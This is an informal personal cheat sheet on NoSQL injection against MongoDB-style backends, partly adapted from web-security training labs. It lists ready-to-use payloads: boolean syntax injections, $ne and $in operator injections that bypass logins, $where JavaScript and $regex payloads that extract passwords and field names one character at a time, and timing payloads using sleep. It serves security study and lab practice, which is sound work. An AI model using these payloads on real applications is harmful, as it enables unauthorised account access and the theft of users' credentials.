# nosqli

before doing anything, think:
“What type does the backend expect here — string, object, or expression?”
Then:
String → logic / syntax injection
Object → operator injection
Expression → boolean / short‑circuit injectio

## syntax injection
test string, if output is any different, its prob vulnerable
%27%22%60%7b%0a%3b%24%46%6f%6f%7d%0a%24%46%6f%6f%20%5c%78%59%5a

payload 1:
` ' && 0 && 'x `
payload 2:
` ' && 1 && 'x `


if output different, its vulnerable.


sqli "or 1=1; equivalent:
` string'||'1'=='1 `
will evaluate to this.category = 'string'||'1'=='1'

this payload is useful
` string'||'1'=='1'||'1 `
as, if theres any checks for more properties / filters, this will still always evaluate to true
as, literally anything|| true || true && literally anything; will always evaluate to true.

`%00` occasionally works too as a null character, so trying it isnt a bad idea, dont expect anything though.


## operator injection

firstly:
`$where` - Matches documents that satisfy a JavaScript expression.
`$ne` - Matches all values that are not equal to a specified value.
`$in` - Matches all of the values specified in an array.
`$regex` - Selects documents where values match a specified regular expression.


### login example:
if theres sum like:

`{"username":"wiener","password":"peter"}`
but idk the credentials, i could try injecting `{"$ne":"flsdjfkdsjfklsdjl"}` in the username and password parameters.
this is only a thing if its being parsed as an object though, and also if the password isnt being hashed.

if the password is being hashed, but the injection still reaches the username, i can put a stupid password like "password123", with the `{"$ne":"flsdjfkdsjfklsdjl"}` in the username, and if the password exists at all in the db, it will bypass login.

i can target a specific account like:
`{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`


# data exfiltration

## via syntax injection

Exfiltrating data in MongoDB
Consider a vulnerable application that allows users to look up other registered usernames and displays their role. This triggers a request to the URL:

https://insecure-website.com/user/lookup?username=admin
This results in the following NoSQL query of the users collection:

{"$where":"this.username == 'admin'"}
As the query uses the $where operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data. For example, you could send the following payload:

admin' && this.password[0] == 'a' || 'a'=='b
This returns the first character of the user's password string, enabling you to extract the password character by character.


### section below would almost never work, tho, ill still put it here
For example, to identify whether the MongoDB database contains a password field, you could submit the following payload:

https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
Send the payload again for an existing field and for a field that doesn't exist. In this example, you know that the username field exists, so you could send the following payloads:

admin' && this.username!=' admin' && this.foo!='
If the password field exists, you'd expect the response to be identical to the response for the existing field (username), but different to the response for the field that doesn't exist (foo).
### section above would almost never work, tho, ill still put it here

## via operator injection

{"username":"wiener","password":"peter"}
To test whether you can inject operators, you could try adding the $where operator as an additional parameter, then send one request where the condition evaluates to false, and another that evaluates to true. For example:

{"username":"wiener","password":"peter", "$where":"0"}{"username":"wiener","password":"peter", "$where":"1"}
If there is a difference between the responses, this may indicate that the JavaScript expression in the $where clause is being evaluated.

If you have injected an operator that enables you to run JavaScript, you may be able to use the keys() method to extract the name of data fields. For example, you could submit the following payload:

"$where":"Object.keys(this)[0].match('^.{0}a.*')"
This inspects the first data field in the user object and returns the first character of the field name. This enables you to extract the field name character by character.

### login example again

You could start by testing whether the $regex operator is processed as follows:

{"username":"admin","password":{"$regex":"^.*"}}
If the response to this request is different to the one you receive when you submit an incorrect password, this indicates that the application may be vulnerable. You can use the $regex operator to extract data character by character. For example, the following payload checks whether the password begins with an a:

{"username":"admin","password":{"$regex":"^a*"}}

## time based data exfil

### likely unimportant, ill still put it here tho.
Timing based injection
Sometimes triggering a database error doesn't cause a difference in the application's response. In this situation, you may still be able to detect and exploit the vulnerability by using JavaScript injection to trigger a conditional time delay.

To conduct timing-based NoSQL injection:

Load the page several times to determine a baseline loading time.
Insert a timing based payload into the input. A timing based payload causes an intentional delay in the response when executed. For example, {"$where": "sleep(5000)"} causes an intentional delay of 5000 ms on successful injection.
Identify whether the response loads more slowly. This indicates a successful injection.
The following timing based payloads will trigger a time delay if the password beings with the letter a:

admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'



